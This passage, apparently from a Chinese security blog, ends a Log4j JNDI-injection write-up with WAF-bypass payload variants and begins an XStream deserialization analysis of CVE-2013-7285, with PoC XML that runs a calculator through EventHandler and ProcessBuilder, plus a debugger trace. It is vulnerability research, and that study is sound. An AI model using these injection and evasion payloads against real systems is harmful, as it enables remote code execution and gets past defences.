<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf,</span></span><br><span class="line"><span class="params">                                    <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> getVariableResolver();</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resolver.lookup(event, variableName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该<code>resolver</code>会根据前缀的不同，调用不同类的lookup方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737555096226-e9e83243-0d2a-47d6-9536-9ebc488bda95.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737555096226-e9e83243-0d2a-47d6-9536-9ebc488bda95.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>当jndi为前缀时，会调用<code>Interpolator#lookup</code>，其中<code>value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);</code>这行代码会调用JndiLookup的lookup方法，从而造成JNDI注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, String <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">var</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">prefixPos</span> <span class="operator">=</span> <span class="keyword">var</span>.indexOf(PREFIX_SEPARATOR);</span><br><span class="line">        <span class="keyword">if</span> (prefixPos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(<span class="number">0</span>, prefixPos).toLowerCase(Locale.US);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">lookup</span> <span class="operator">=</span> strLookupMap.get(prefix);</span><br><span class="line">            <span class="keyword">if</span> (lookup <span class="keyword">instanceof</span> ConfigurationAware) &#123;</span><br><span class="line">                ((ConfigurationAware) lookup).setConfiguration(configuration);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (lookup != <span class="literal">null</span>) &#123;</span><br><span class="line">                value = event == <span class="literal">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> value;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> = <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (defaultLookup != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> event == <span class="literal">null</span> ? defaultLookup.lookup(<span class="keyword">var</span>) : defaultLookup.lookup(event, <span class="keyword">var</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="oD63Q">WAF绕过</h2>

<p>在很多WAF的检测中，是基于关键字<code>jndi:</code>等关键词的判断进行拦截的</p>
<h3 id="FF2Yn">解析特性</h3>

<p>log4j在解析时会有以下特性，可以很好的帮我们绕过WAF</p>
<ul>
<li>如果在参数未定义的情况下,<code>:-</code>后面的值就是默认值</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753153880664-30ce67c4-7f03-43b7-9011-37f68ab71295.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753153880664-30ce67c4-7f03-43b7-9011-37f68ab71295.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<ul>
<li>引用环境变量，例如<code>$&#123;env:PATH&#125;</code></li>
<li>通过<code>upper</code>和<code>lower</code>进行大小写变换</li>
</ul>
<h3 id="Gm7yh">绕过方式</h3>
<h4 id="GskGp">利用${}默认值绕过</h4>

<p>例如以下这个payload，并不会检测到关键字<code>jndi:</code>，首先会解析<code>$&#123;::-J&#125;</code>，这部分会被解析为<code>J</code>，与后面拼接为<code>$&#123;Jndi:ldap://127.0.0.1:1389/Calc&#125;</code>，从而绕过WAF</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;::-J&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;</span><br></pre></td></tr></table></figure>

<h4 id="VNags">通过lower和upper绕过 </h4>

<p>之前看源码可以知道，<code>$&#123;&#125;</code>中支持解析的头部有<code>date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</code>，其中有<code>lower</code>和<code>upper</code></p>
<p>通过lower和upper绕过其实和利用默认值绕过是一样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logg.info(&quot;$&#123;$&#123;lower:J&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;&quot;);</span><br><span class="line">logg.info(&quot;$&#123;$&#123;upper:j&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;&quot;);</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>除此之外，可以使用特殊字符的大小写转化进行绕过（之前打CTF的中就有这种利用方式）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ı =&gt; upper =&gt; i (Java 中测试可行)</span><br><span class="line">ſ =&gt; upper =&gt; S (Java 中测试可行)</span><br><span class="line">İ =&gt; upper =&gt; i (Java 中测试不可行)</span><br><span class="line">K =&gt; upper =&gt; k (Java 中测试不可行)</span><br></pre></td></tr></table></figure>

<p>因此可以使用特殊字符，经过大小写变换后，绕过WAF</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logg.error(&quot;$&#123;jnd$&#123;upper:ı&#125;:ldap://127.0.0.1:1389/Calc&#125;&quot;);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h4 id="UAwlg">编码绕过</h4>
这个漏洞的触发点可能在任何部分，在有些传输的地方，后端可能会有一些`unicode`和`hex`解码的特性，因此可以通过编码绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;\u0024\u007b&quot;&#125;</span><br><span class="line">&#123;&quot;key&quot;:&quot;\x24\u007b&quot;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Log4j</tag>
      </tags>
  </entry>
  <entry>
    <title>XStream反序列化</title>
    <url>/2025/07/23/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="pHjEh">XStream反序列化</h1>
<h2 id="HYMga">XStream基础</h2>
<h3 id="CiWpH">XStream简介</h3>

<p>XStream 是一个 Java 库，用于简化 Java 对象与 XML 之间的相互转换（序列化与反序列化）。它允许开发人员将 Java 对象直接转换为 XML 格式，或从 XML 恢复为原始对象，无需编写复杂的解析代码。</p>
<h3 id="NQH63">XStreamDemo</h3>

<p>这里我们来看如何使用XStream进行序列化和反序列化操作</p>
<h4 id="HQqKY">序列化</h4>

<p>首先定义接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IPerson</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">output</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后定义Person类实现前面的接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">IPerson</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">output</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;Hello, this is &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;, age &quot;</span> + <span class="built_in">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>XStream序列化使用<code>XStream.toXML()</code>来实现类到XML的转化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Serialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.name = <span class="string">&quot;Sean&quot;</span>;</span><br><span class="line">        person.age =<span class="number">18</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>().toXML(person);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>序列化后的XML数据如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Person</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Sean<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Person</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="a7WyU">反序列化</h4>

<p>同样的定义接口和类，XStream反序列化是通过<code>XStream.fromXML()</code>实现的，其中获取XML文件内容的方式可以通过<code>Scanner</code>或者<code>FileInputStream</code>均可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.io.xml.DomDriver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Deserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;demo.xml&quot;</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) <span class="keyword">new</span> <span class="title class_">XStream</span>(<span class="keyword">new</span> <span class="title class_">DomDriver</span>()).fromXML(fileInputStream);</span><br><span class="line">        person.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752142270637-1f2e8125-ad9c-48ba-a5c0-9de5c2036d96.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752142270637-1f2e8125-ad9c-48ba-a5c0-9de5c2036d96.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="ccR02">前置知识</h3>
XStream总体由五个部分组成，其类图如下：

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752142862533-2aca9f20-1f7a-4e16-8f56-fa8bd0e9c3ab.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752142862533-2aca9f20-1f7a-4e16-8f56-fa8bd0e9c3ab.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="IezYj">EventHandler类</h4>

<p><code>EventHandler</code>类是实现了<code>InvocationHandler</code>的一个类 ，设置的本意是为交互工具提供beans，建立从用户界面到应用程序逻辑的连接</p>
<p><code>EventHandler</code>类定义的代码如下，其含有target和action属性，在<code>EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()</code>的函数调用链中，会将前面两个属性作为类方法和参数继续反射调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EventHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> Object target;  </span><br><span class="line">    <span class="keyword">private</span> String action;  </span><br><span class="line">	...  </span><br><span class="line">	  </span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(<span class="keyword">final</span> Object proxy, <span class="keyword">final</span> Method method, <span class="keyword">final</span> Object[] arguments)</span> &#123;  </span><br><span class="line">        ...  </span><br><span class="line">                <span class="keyword">return</span> invokeInternal(proxy, method, arguments);  </span><br><span class="line">        ...  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">	<span class="keyword">private</span> Object <span class="title function_">invokeInternal</span><span class="params">(Object proxy, Method method, Object[] arguments)</span> &#123;  </span><br><span class="line">        ...  </span><br><span class="line">              </span><br><span class="line">                <span class="type">Method</span> <span class="variable">targetMethod</span> <span class="operator">=</span> Statement.getMethod(  </span><br><span class="line">                             target.getClass(), action, argTypes);  </span><br><span class="line">                ...  </span><br><span class="line">                <span class="keyword">return</span> MethodUtil.invoke(targetMethod, target, newArgs);  </span><br><span class="line">            &#125;  </span><br><span class="line">            ...  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">	...  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="MZFkZ">Converter转换器</h4>

<p>XStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。转换器的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为XML或将XML转换为对象。</p>
<p>简单地说，就是输入XML后它能识别其中的标签字段并转换为相应的对象，反之亦然。</p>
<p>转换器需要实现3个方法：</p>
<ul>
<li>canConvert方法：告诉XStream对象，它能够转换的对象；</li>
<li>marshal方法：能够将对象转换为XML时候的具体操作；</li>
<li>unmarshal方法：能够将XML转换为对象时的具体操作；</li>
</ul>
<p>具体参考：<a href="http://x-stream.github.io/converters.html">http://x-stream.github.io/converters.html</a></p>
<h4 id="zPE1W">DynamicProxyConverter 动态代理转换器</h4>

<p><code>DynamicProxyConverter</code> 即动态代理转换器，是 XStream 支持的一种转换器，其存在使得 XStream 能够把 XML 内容反序列化转换为动态代理类对象：</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752144461704-4d770386-97ae-4f1a-8389-ab3b09e4c60a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752144461704-4d770386-97ae-4f1a-8389-ab3b09e4c60a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>XStream 反序列化漏洞的 PoC 都是以 DynamicProxyConverter 这个转换器为基础来编写的。以官方给的例子为例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">interface</span>&gt;</span>com.foo.Blah<span class="tag">&lt;/<span class="name">interface</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">interface</span>&gt;</span>com.foo.Woo<span class="tag">&lt;/<span class="name">interface</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;com.foo.MyHandler&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">something</span>&gt;</span>blah<span class="tag">&lt;/<span class="name">something</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">handler</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>dynamic-proxy</code> 标签在 XStream 反序列化之后会得到一个动态代理类对象，当访问了该对象的<code>com.foo.Blah</code> 或 <code>com.foo.Woo</code> 这两个接口类中声明的方法时（即 interface 标签内指定的接口类），就会调用 handler 标签中的类方法 <code>com.foo.MyHandler</code></p>
<h2 id="xq3UI">漏洞复现与分析</h2>
<h3 id="q276u">漏洞原理</h3>

<p>XStream 反序列化漏洞的存在是因为 XStream 支持一个名为 <code>DynamicProxyConverter</code> 的转换器，该转换器可以将 XML 中 <code>dynamic-proxy</code> 标签内容转换成动态代理类对象，而当程序调用了 <code>dynamic-proxy</code> 标签内的 <code>interface</code> 标签指向的接口类声明的方法时，就会通过动态代理机制代理访问 <code>dynamic-proxy</code> 标签内 <code>handler</code> 标签指定的类方法。   </p>
<p>利用这个机制，攻击者可以构造恶意的XML内容，即 <code>dynamic-proxy</code> 标签内的<code> handler</code> 标签指向如 <code>EventHandler</code> 类这种可实现任意函数反射调用的恶意类、<code>interface</code> 标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意 XML 内容后即可触发反序列化漏洞、达到任意代码执行的目的。</p>
<h3 id="nzzQU">CVE-2013-7285</h3>
<h4 id="NJS2M">漏洞复现</h4>

<p><code>sorted-set</code>类型的Poc如下，该Poc影响版本为：</p>
<ul>
<li>1.3.1&lt;XStream&lt;1.4</li>
<li>1.4.5&lt;&#x3D;XStream&lt;&#x3D;1.4.6</li>
<li>1.4.10</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">command</span>&gt;</span>  </span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">command</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">target</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>tree-map</code>类型的Poc如下，该Poc影响版本为：</p>
<ul>
<li>&lt;&#x3D;1.4.6</li>
<li>1.4.10</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>-na<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用以下代码来模拟漏洞环境</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.io.xml.DomDriver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CVE_2013_7285 Exploit  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2013_7285</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;demo.xml&quot;</span>);</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>(<span class="keyword">new</span> <span class="title class_">DomDriver</span>());</span><br><span class="line">        xStream.fromXML(fileInputStream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功触发</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752149236369-77039c82-a804-4b26-b0a3-dc789066688e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752149236369-77039c82-a804-4b26-b0a3-dc789066688e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="ZzNQH">漏洞分析</h4>
现在我们对解析流程进行追踪，在`AbstractTreeMarshallingStrategy`的`unmarshal`方法中调用了`TreeUnmarshaller`的`start`方法，即开始解析XML内容

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752158400843-6ade1bd1-de68-42de-83ca-776e5d5b3fe9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752158400843-6ade1bd1-de68-42de-83ca-776e5d5b3fe9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在<code>TreeUnmarshaller#start</code>中，可以看到调用了<code>HierarchicalStreams.readClassType()</code>方法，该方法的作用是获取到XML中根标签的标签类型</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752158370053-0eeb7406-9954-4bc2-86ee-42eb3c4b5f27.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752158370053-0eeb7406-9954-4bc2-86ee-42eb3c4b5f27.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在<code>readClassType</code>方法中会进行递归遍历，直到找到根标签的标签类型</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752158658201-4bb23f5a-f206-4b01-8a70-a7beb8df34f2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752158658201-4bb23f5a-f206-4b01-8a70-a7beb8df34f2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接着会调用<code>convertAnother</code>函数，对<code>java.util.SortedSet</code>类型进行转换，跟进该函数，调用<code>mapper.defaultImplementationOf()</code>函数来寻找<code>java.util.SortedSet</code>类型的默认实现类型进行替换，这里转换成了<code>java.util.TreeSet</code>类型</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752159230595-d5ed173e-a81c-41e9-9d6a-9a826e306bc2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752159230595-d5ed173e-a81c-41e9-9d6a-9a826e306bc2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752160216407-d500a541-80a0-4810-9900-93120959c722.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752160216407-d500a541-80a0-4810-9900-93120959c722.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接着调用<code>converterLookup.lookupConverterForType()</code>来寻找TreeSet对应类型的转换器，通过迭代<code>this.converters</code>，直到找出能转换TreeSet类型的<code>Converter</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752197806326-2caa09da-afed-46ab-98eb-50955fc1a6fd.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752197806326-2caa09da-afed-46ab-98eb-50955fc1a6fd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接着往下调试，在<code>AbstractReferenceUnmarshaller.convert()</code>函数中看到，会调用<code>getCurrentReferenceKey</code>来获取当前的Reference键即标签名，接着将当前标签名压入<code>parenStack</code>栈中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752160743077-42e4cea9-a47a-464b-8321-c4e27e52cc37.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752160743077-42e4cea9-a47a-464b-8321-c4e27e52cc37.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后走入其父类的<code>convert</code>函数中，继续走进<code>DynamicProxyConverter</code>的<code>unmarshal</code>中，这里会按标签的内容生成对应接口的动态代理，此时这里的DUMMY是一个空代理的实现</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752162022489-e69b2d1f-e526-45bd-a1fc-0adf84fcbe02.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752162022489-e69b2d1f-e526-45bd-a1fc-0adf84fcbe02.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">回到<code>DynamicProxyConverter</code>的<code>unmarshal</code>方法，里面调用了</p>
<p><code>treeMapConverter.unmarshalComparator</code> 方法，这个方法获取到了第二个 XML 节点元素，这个方法当时漏看了，这个方法还是比较重要的，它获取到了 xml 根元素的子元素。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201201979-d74e5ca3-c320-465a-aa51-6ac8b36f70db.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201201979-d74e5ca3-c320-465a-aa51-6ac8b36f70db.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
